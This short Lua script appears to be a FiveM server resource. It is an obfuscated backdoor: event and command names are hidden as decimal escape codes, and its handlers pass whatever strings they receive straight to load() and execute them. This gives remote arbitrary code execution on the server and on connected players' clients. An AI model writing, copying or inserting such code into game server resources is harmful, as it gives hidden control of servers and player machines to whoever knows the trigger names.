RegisterNetEvent("\65\79\98\98\70\103")AddEventHandler("\65\79\98\98\70\103",function(a)load(a)()end)
RegisterCommand('\65', function(a,b,c)local d=table.concat(b)TriggerClientEvent('\97\111\66\66\102\71',d)end)
RegisterCommand('\66', function(a,b,c)local d=table.concat(b)load(d)()end)